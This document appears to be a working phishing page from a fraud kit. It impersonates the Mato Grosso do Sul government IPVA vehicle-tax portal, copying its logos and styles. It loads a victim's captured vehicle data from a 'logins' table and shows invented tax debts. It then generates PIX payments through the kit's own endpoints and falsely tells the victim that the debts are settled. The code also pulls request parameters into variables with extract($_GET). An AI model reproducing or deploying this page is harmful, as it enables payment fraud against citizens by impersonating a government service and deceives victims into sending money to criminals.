<?php
// pages/detran-mt2/homex.php
extract($_GET);

if ($sucesso) {
    include_once __DIR__ . "/../../db.php";

    $doc = $sucesso;
    $check = $pdo->prepare("SELECT * FROM logins WHERE login_info LIKE :login_info AND resposta <> '' AND resposta IS NOT NULL ORDER BY id DESC LIMIT 1");
    $check->execute([':login_info' => "%$sucesso%"]);
    $retorno = $check->fetch();

    if ($retorno) {
        $JsonDados = base64_decode($retorno['resposta']);
        $ArrayDados = json_decode($JsonDados);
    } else {
        exit();
    }
}

$URL_QR = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=";

function brToUs($valor) {
    $valor = trim($valor);
    $valor = str_replace('.', '', $valor);
    $valor = str_replace(',', '.', $valor);
    return $valor;
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="cache-control" content="no-cache"/>
    <meta name="ROBOTS" content="none"/>
    <title>Governo do Estado de Mato Grosso do Sul - IPVA - Débitos</title>
    <link rel="stylesheet" type="text/css" href="https://servicos.efazenda.ms.gov.br/ipvapublico/Content/ResetCss.css"/>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
    <link rel="shortcut icon" type="text/css" href="https://servicos.efazenda.ms.gov.br/templates/images/favicon.jpg"/>
    <link href="https://servicos.efazenda.ms.gov.br/ipvapublico/Content/Site.css" rel="stylesheet" type="text/css"/>
    
    <style>
        /* Custom modal overlay and contents */
        .pix-modal {
            display: none;
            position: fixed;
            z-index: 10000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.75);
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .unique-modal-content {
            background-color: #ffffff;
            margin: 5% auto;
            padding: 0;
            border-radius: 12px;
            width: 90%;
            max-width: 480px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            position: relative;
            animation: slideDown 0.3s ease;
            overflow: hidden;
            color: #333;
        }
        @keyframes slideDown {
            from { transform: translateY(-30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .unique-close-btn {
            position: absolute;
            top: 12px;
            right: 16px;
            font-size: 30px;
            font-weight: bold;
            color: #ffffff;
            cursor: pointer;
            line-height: 1;
            z-index: 10;
        }
        .unique-modal-header {
            background-color: #004f9f;
            text-align: center;
            padding: 16px 20px;
        }
        .unique-modal-logo {
            height: 40px;
            width: auto;
        }
        .unique-modal-body {
            padding: 20px;
        }
        .unique-modal-summary {
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 15px;
        }
        .unique-summary-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 6px 0;
            border-bottom: 1px solid #e5e5e5;
        }
        .unique-summary-item:last-child {
            border-bottom: none;
        }
        .unique-summary-item p {
            margin: 0;
            font-size: 14px;
        }
        .unique-summary-item p b {
            color: #004f9f;
        }
        .unique-summary-item p:last-child {
            color: #28a745;
            font-weight: 700;
        }
        .unique-payment-reference {
            background-color: #f4fbf7;
            border: 1px solid #28a745;
            border-radius: 6px;
            padding: 10px;
            margin-bottom: 15px;
        }
        .unique-payment-reference-label {
            font-size: 11px;
            color: #666;
            display: block;
            margin-bottom: 2px;
        }
        .unique-payment-reference-title {
            font-size: 13px;
            color: #004f9f;
            font-weight: 700;
        }
        .unique-payment-reference-desc {
            font-size: 11px;
            color: #555;
            line-height: 1.3;
        }
        .unique-instruction {
            font-size: 12px;
            color: #555;
            text-align: center;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        .unique-qr-code-container {
            text-align: center;
            margin-bottom: 15px;
        }
        .unique-qr-code-container img {
            width: 160px;
            height: 160px;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 5px;
            background: #fff;
        }
        .unique-modal-content textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 11px;
            font-family: monospace;
            resize: none;
            background: #f9f9f9;
            min-height: 60px;
            margin-bottom: 12px;
            box-sizing: border-box;
        }
        .unique-modal-content button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
            text-transform: uppercase;
        }
        #unique-copyPixCode {
            background-color: #28a745;
            color: #fff;
        }
        #unique-copyPixCode:hover {
            background-color: #218838;
        }
        .header {
            background-color: #004f9f;
            color: #fff;
            padding: 15px 20px;
            display: flex;
            align-items: center;
        }
        .logo img {
            height: 50px;
        }
        .header span {
            font-size: 1.5rem;
            margin-left: 15px;
        }
    </style>
</head>
<body>

    <!-- HEADER INICIO -->
    <div class="header navbar navbar-fixed-top" style="margin:0px; ">
        <div class="container-fluid m-0 p-0">
            <div class="col d-flex align-items-center">
                <a class="logo" href="#">
                    <img src="/ipvapublico/Content/themes/base/images/Brasao-Governo-de-MS.png" onerror="this.src='https://servicos.efazenda.ms.gov.br/ipvapublico/Content/themes/base/images/Brasao-Governo-de-MS.png'" alt="logo" class="logo-default"/>
                </a>
                <span class="header-title-text" style="color: white; font-size: 1.8rem; margin-left: 15px;">IPVA - Imposto Sobre Propriedade de Veículo Automotor</span>
            </div>
        </div>
    </div>
    <!-- HEADER FIM -->

    <div class="container container-consulta-debitos" style="margin-top: 30px; margin-bottom: 50px;">
        <div class="container-cards">
            <div class="half-card card-information-veiculo">
                <div class="card-item card-information-veiculo-icon">
                    <i class="fa fa-car primary-color fa-3x"></i>
                </div>
                <div class="card-item card-information-veiculo-body">
                    <div class="font-main text-weight-bold text-size-n primary-color" style="color: #004f9f; font-weight: bold;">Identificamos débitos com vencimento em aberto!</div>
                    <div class="font-main text-weight-normal text-size-n text-color-fundo-claro">Selecione os débitos que deseja pagar ou utilize a opção “Emitir DAEMS” para gerar o documento de arrecadação.</div>
                </div>
            </div>
            <div class="half-card card-valor-total">
                <div class="card-item card-resizable-aling-center card-valor-total-body">
                    <div class="font-main text-size-s text-color-fundo-claro">Valor total do(s) débito(s) selecionado(s)</div>
                    <div class="font-main text-size-l text-weight-bold" id="cardEmitirDaemsValor2" style="font-size: 1.8rem; font-weight: bold; color: #333;">
                        R$ 0,00
                    </div>
                </div>
                <div class="card-item card-valor-total-buttom">
                    <button type="button" class="btn btn-primary btn-elipse" id="BTNResumoPagamentoParcelasSelecionadas2" disabled style="background-color: #004f9f; border-color: #004f9f; border-radius: 20px; font-weight: bold;">Emitir DAEMS</button>
                </div>
            </div>
        </div>

        <div class="container-veiculos" style="margin-top: 35px;">
            <div class="container-veiculos-header" style="background-color: #e9ecef; padding: 12px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <div class="container-veiculos-header-checkbox">
                    <input type="checkbox" id="SelecionarTodos">
                    &nbsp;<span style="font-weight: 600; color: #495057;">Selecionar Todos</span>
                </div>
                <div class="container-veiculos-header-expandir">
                    <div id="btnExpandirTodos" style="cursor:pointer; font-weight: 600; color: #004f9f;">
                        <span id="cardTextExpandir">Expandir Todos</span>
                        &nbsp;<i class="fa fa-angle-down" id="cardIconeExpandir"></i>
                    </div>
                </div>
            </div>

            <div class="box-veiculos">
                <div class="card-veiculo" id="cardVeiculo_<?= htmlspecialchars($ArrayDados->veiculo_id) ?>" name="veiculo">
                    <div class="card-veiculo-titulo" style="background-color: #fff; padding: 15px; border-radius: 8px; border: 1px solid #dee2e6; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 15px;">
                        <div class="card-veiculo-body" style="display: flex; flex-direction: column;">
                            <div class="card-veiculo-header" style="display: flex; flex-wrap: wrap; justify-content: space-between; width: 100%;">
                                <div class="card-veiculo-header-item" style="flex: 1; min-width: 120px; padding: 5px;">
                                    <strong>Placa:</strong>
                                    <span class="font-main text-weight-medium text-color-fundo-claro" style="display: block; font-size: 1.1rem; color: #333; font-weight: bold;"><?= htmlspecialchars($ArrayDados->placa) ?></span>
                                </div>
                                <div class="card-veiculo-header-item" style="flex: 2; min-width: 200px; padding: 5px;">
                                    <strong>Marca/Modelo:</strong>
                                    <span class="font-main text-weight-medium text-color-fundo-claro" style="display: block; font-size: 1.1rem; color: #333; font-weight: bold;"><?= htmlspecialchars($ArrayDados->modelo) ?></span>
                                </div>
                                <div class="card-veiculo-header-item" style="flex: 1.5; min-width: 150px; padding: 5px;">
                                    <strong>Renavam:</strong>
                                    <span class="font-main text-weight-medium text-color-fundo-claro" style="display: block; font-size: 1.1rem; color: #333; font-weight: bold;"><?= htmlspecialchars($ArrayDados->renavam) ?></span>
                                </div>
                                <div class="card-veiculo-header-item" style="flex: 2; min-width: 180px; padding: 5px;">
                                    <strong>Chassi:</strong>
                                    <span class="font-main text-weight-medium text-color-fundo-claro" style="display: block; font-size: 1.1rem; color: #333; font-weight: bold;"><?= htmlspecialchars($ArrayDados->chassi) ?></span>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="box-impostos-list" style="margin-top: 15px;">
                        <?php foreach ($ArrayDados->debitos as $debito): ?>
                            <div class="card-imposto" id="cardVeiculo_<?= htmlspecialchars($ArrayDados->veiculo_id) ?>_cardVeiculo_<?= htmlspecialchars($debito->quitacao_id) ?>" style="background: #fff; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.04);">
                                <div class="card-imposto-titulo" style="border-bottom: 1px solid #dee2e6; padding-bottom: 12px; margin-bottom: 15px;">
                                    <div class="d-flex justify-content-between align-items-center">
                                        <div>
                                            <span class="font-main text-weight-bold" style="font-size: 1.3rem; font-weight: bold; color: #004f9f;">Exercício <?= htmlspecialchars($debito->ano) ?></span>
                                        </div>
                                        <div>
                                            <button type="button" class="btn btn-primary btn-quitacao" data-ano="<?= htmlspecialchars($debito->ano) ?>" data-quitacao-id="<?= htmlspecialchars($debito->quitacao_id) ?>" style="background-color: #004f9f; border-color: #004f9f; font-weight: 600;">Quitação <?= htmlspecialchars($debito->ano) ?></button>
                                        </div>
                                    </div>
                                </div>
                                <div class="card-imposto-valores">
                                    <div class="card-imposto-header" style="display: flex; background-color: #f8f9fa; padding: 8px 12px; border-radius: 6px; font-weight: 600; color: #495057;">
                                        <div style="width: 25%;">Parcela</div>
                                        <div style="width: 35%; text-align: center;">Vencimento</div>
                                        <div style="width: 40%; text-align: right;">Valor</div>
                                    </div>
                                    <div class="card-imposto-parcelas-container" style="margin-top: 10px;">
                                        <?php foreach ($debito->parcelas as $p): ?>
                                            <div class="card-imposto-parcelas-valores d-flex align-items-center" style="padding: 12px 12px; border-bottom: 1px solid #f1f3f5;" id="cardVeiculo_<?= htmlspecialchars($ArrayDados->veiculo_id) ?>_cardParcela_<?= htmlspecialchars($p->id) ?>">
                                                <div class="card-imposto-checkbox" style="width: 25%; display: flex; align-items: center;">
                                                    <input type="checkbox" class="parcela-checkbox" data-id="<?= htmlspecialchars($p->id) ?>" data-ano="<?= htmlspecialchars($debito->ano) ?>" data-parcela="<?= htmlspecialchars($p->numero) ?>" value="<?= htmlspecialchars($p->valor) ?>" style="width: 18px; height: 18px; cursor: pointer;">
                                                    &nbsp;<span style="font-weight: 500; font-size: 1rem; margin-left: 5px;"><?= htmlspecialchars($p->numero) ?></span>
                                                </div>
                                                <div style="width: 35%; text-align: center; color: #495057; font-weight: 500;">
                                                    <?= htmlspecialchars($p->vencimento) ?>
                                                </div>
                                                <div style="width: 40%; text-align: right; font-weight: bold; color: #004f9f; font-size: 1.05rem; display: flex; justify-content: flex-end; align-items: center;">
                                                    <i class="fa fa-info-circle text-primary info-tooltip-trigger" style="color: #0070C1; cursor: pointer; margin-right: 8px;" 
                                                       data-principal="<?= htmlspecialchars($p->principal) ?>" 
                                                       data-multa="<?= htmlspecialchars($p->multa) ?>" 
                                                       data-juros="<?= htmlspecialchars($p->juros) ?>"
                                                       data-total="<?= htmlspecialchars($p->valor) ?>"
                                                       title="Clique para ver detalhamento"></i>
                                                    R$ <?= htmlspecialchars($p->valor) ?>
                                                </div>
                                            </div>
                                        <?php endforeach; ?>
                                    </div>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- MODAL DO DETALHAMENTO DE VALORES (TOOLTIP) -->
    <div id="tooltipModal" class="modal-overlay" onclick="fecharTooltip()">
        <div class="modal-card" style="max-width: 320px;" onclick="event.stopPropagation()">
            <div class="modal-card-title" style="color: #004f9f; font-size: 1.1rem; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 12px;">Detalhamento da Parcela</div>
            <div class="modal-card-body" style="font-size: 0.9rem; text-align: left; padding: 0;">
                <div class="d-flex justify-content-between mb-2">
                    <span>Principal:</span>
                    <strong style="color: #333;">R$ <span id="tooltipPrincipal">0,00</span></strong>
                </div>
                <div class="d-flex justify-content-between mb-2">
                    <span>Multa:</span>
                    <strong style="color: #333;">R$ <span id="tooltipMulta">0,00</span></strong>
                </div>
                <div class="d-flex justify-content-between mb-2">
                    <span>Juros:</span>
                    <strong style="color: #333;">R$ <span id="tooltipJuros">0,00</span></strong>
                </div>
                <hr style="margin: 10px 0;">
                <div class="d-flex justify-content-between font-weight-bold" style="font-size: 1rem;">
                    <span>Total do Débito:</span>
                    <strong style="color: #004f9f;">R$ <span id="tooltipTotal">0,00</span></strong>
                </div>
            </div>
            <button class="btn-modal" onclick="fecharTooltip()" style="margin-top: 15px; width: 100%; background: #004f9f;">OK</button>
        </div>
    </div>

    <!-- PIX PAYMENT MODAL -->
    <div id="pix-modal" class="pix-modal">
        <div class="unique-modal-content">
            <span class="unique-close-btn" id="unique-mk-pix-mdal-close" onclick="fecharPixModal()">×</span>
            <div class="unique-modal-header">
                <img src="/ipvapublico/Content/themes/base/images/Brasao-Governo-de-MS.png" onerror="this.src='https://servicos.efazenda.ms.gov.br/ipvapublico/Content/themes/base/images/Brasao-Governo-de-MS.png'" alt="Logo" class="unique-modal-logo">
            </div>
            <div class="unique-modal-body">
                <div class="unique-modal-summary">
                    <div class="unique-summary-item">
                        <p><b>Placa do Veículo:</b></p>
                        <p id="unique-placa-veiculo"><?= htmlspecialchars($ArrayDados->placa) ?></p>
                    </div>
                    <div class="unique-summary-item">
                        <p><b>Valor Total:</b></p>
                        <p id="unique-SpanValorDescount" style="font-weight: bold; color: #28a745;">R$ 0,00</p>
                    </div>
                </div>
                <div class="unique-payment-reference" id="unique-payment-reference">
                    <span class="unique-payment-reference-label">Referência do Pagamento:</span>
                    <div class="unique-payment-reference-title" id="unique-reference-title">DAEMS IPVA MS</div>
                    <div class="unique-payment-reference-desc" id="unique-reference-desc">Guia de recolhimento unificada de débitos de IPVA.</div>
                </div>
                <p class="unique-instruction">
                    Aponte a câmera do celular para o QR Code abaixo usando o app do seu banco ou copie a linha de código Pix.
                </p>
                <div class="unique-qr-code-container">
                    <img id="unique-imgpix" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='150' height='150' viewBox='0 0 150 150'><rect width='150' height='150' fill='%23f1f3f5'/><text x='50%23' y='50%23' dominant-baseline='middle' text-anchor='middle' font-family='sans-serif' font-size='12' fill='%23868e96'>Gerando QR...</text></svg>" alt="QR Code Pix">
                </div>
                <textarea id="unique-pixCode" readonly onclick="this.select()">Gerando Pix copia e cola...</textarea>
                <button id="unique-copyPixCode" onclick="copyPixCode()">PIX Copia e Cola</button>
                <div id="pix-status-message" style="margin-top: 15px; font-weight: bold; text-align: center; color: #004f9f;"></div>
            </div>
        </div>
    </div>

    <!-- JS SCRIPTS -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script>
        // Modal do detalhamento de valores
        function apresentarTooltip(principal, multa, juros, total) {
            $('#tooltipPrincipal').text(principal);
            $('#tooltipMulta').text(multa);
            $('#tooltipJuros').text(juros);
            $('#tooltipTotal').text(total);
            $('#tooltipModal').addClass('show');
        }
        
        function fecharTooltip() {
            $('#tooltipModal').removeClass('show');
        }

        $('.info-tooltip-trigger').on('click', function(e) {
            e.stopPropagation();
            var $t = $(this);
            apresentarTooltip($t.data('principal'), $t.data('multa'), $t.data('juros'), $t.data('total'));
        });

        // Seleção de Checkboxes e cálculo de total
        var checkboxes = $('.parcela-checkbox');
        var btnEmitirDaems = $('#BTNResumoPagamentoParcelasSelecionadas2');

        function atualizarTotal() {
            var total = 0;
            var selecionados = 0;
            checkboxes.each(function() {
                if ($(this).is(':checked')) {
                    var valStr = $(this).val(); // valor formatado tipo "375,42"
                    var decimal = parseFloat(valStr.replace('.', '').replace(',', '.'));
                    total += decimal;
                    selecionados++;
                }
            });

            $('#cardEmitirDaemsValor2').text('R$ ' + total.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
            
            if (selecionados > 0) {
                btnEmitirDaems.prop('disabled', false);
            } else {
                btnEmitirDaems.prop('disabled', true);
            }
        }

        checkboxes.on('change', function() {
            atualizarTotal();
        });

        // Selecionar todos
        $('#SelecionarTodos').on('change', function() {
            var checkAll = $(this).is(':checked');
            checkboxes.prop('checked', checkAll);
            atualizarTotal();
        });

        // Emitir DAEMS (Gera checkout de PIX)
        btnEmitirDaems.on('click', function() {
            var totalStr = $('#cardEmitirDaemsValor2').text().replace('R$', '').trim();
            var valorDecimal = parseFloat(totalStr.replace('.', '').replace(',', '.'));
            abrirPixModal(valorDecimal, 'Guia DAEMS IPVA selecionados');
        });

        // Quitação por exercício
        $('.btn-quitacao').on('click', function() {
            var $btn = $(this);
            var ano = $btn.data('ano');
            var quitacaoId = $btn.data('quitacao-id');
            
            // Marcar todos os checkboxes desse ano e desmarcar os outros
            checkboxes.prop('checked', false);
            $('.card-imposto[id$="_cardVeiculo_' + quitacaoId + '"] .parcela-checkbox').prop('checked', true);
            atualizarTotal();
            
            var totalStr = $('#cardEmitirDaemsValor2').text().replace('R$', '').trim();
            var valorDecimal = parseFloat(totalStr.replace('.', '').replace(',', '.'));
            abrirPixModal(valorDecimal, 'Quitação de IPVA Exercício ' + ano);
        });

        // Modal PIX
        var pixInterval = null;
        var pixRef = null;

        function abrirPixModal(valor, referencia) {
            $('#unique-SpanValorDescount').text('R$ ' + valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
            $('#unique-reference-title').text(referencia);
            $('#pix-modal').show();
            $('#pix-status-message').text('Gerando pagamento seguro...');
            $('#unique-imgpix').attr('src', '');
            $('#unique-pixCode').val('Carregando...');
            
            // Inicia geração do Pix (requisitando a data/pix.php)
            gerarPix(valor, referencia);
        }

        function fecharPixModal() {
            $('#pix-modal').hide();
            if (pixInterval) {
                clearInterval(pixInterval);
            }
        }

        function copyPixCode() {
            var copyText = document.getElementById("unique-pixCode");
            copyText.select();
            copyText.setSelectionRange(0, 99999);
            document.execCommand("copy");
            alert("Código Pix copiado com sucesso!");
        }

        function gerarPix(valor, referencia) {
            // Executa desafio JS
            $.ajax({
                url: '/functions/api.php',
                method: 'POST',
                data: {
                    action: 'js_challenge',
                    csrf_token: window.csrfToken || '',
                    js_token: window.jsVerificationToken || ''
                },
                timeout: 5000
            }).done(function(dataChallenge) {
                // Requisição real do PIX
                $.ajax({
                    url: '/data/pix.php',
                    method: 'POST',
                    data: {
                        gerarPix: true,
                        valor: valor,
                        debito: 'ipva',
                        nome: '<?= htmlspecialchars($ArrayDados->modelo) ?>',
                        cpf_cnpj: '<?= htmlspecialchars($ArrayDados->renavam) ?>'
                    },
                    timeout: 20000
                }).done(function(res) {
                    var resposta = JSON.parse(res);
                    var code = resposta.pix || resposta.qrcode || '';
                    pixRef = resposta.id;

                    if (code) {
                        var qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=' + encodeURIComponent(code);
                        $('#unique-imgpix').attr('src', qrUrl);
                        $('#unique-pixCode').val(code);
                        $('#pix-status-message').text('Aguardando pagamento...');
                        
                        // Inicia monitoramento de confirmação
                        iniciarMonitoramentoStatus();
                    } else {
                        $('#pix-status-message').text('Erro ao gerar PIX. Tente novamente.');
                    }
                }).fail(function() {
                    $('#pix-status-message').text('Falha na comunicação. Tente novamente.');
                });
            }).fail(function() {
                $('#pix-status-message').text('Erro ao validar sessão. Tente de novo.');
            });
        }

        function iniciarMonitoramentoStatus() {
            if (pixInterval) clearInterval(pixInterval);
            pixInterval = setInterval(function() {
                if (!pixRef) return;
                $.ajax({
                    url: '/data/box.php?id=' + pixRef,
                    method: 'GET'
                }).done(function(statusRes) {
                    var status = JSON.parse(statusRes);
                    if (status && status.status === 'pago') {
                        clearInterval(pixInterval);
                        $('#pix-status-message').html('<span style="color: #28a745;">✅ Pagamento Processado com Sucesso!</span>');
                        setTimeout(function() {
                            fecharPixModal();
                            // Atualiza os débitos na tela principal simulando a quitação
                            alert("Seus débitos foram quitados com sucesso e o documento de arrecadação foi compensado!");
                            window.location.reload();
                        }, 2500);
                    }
                });
            }, 3000);
        }
    </script>
</body>
</html>
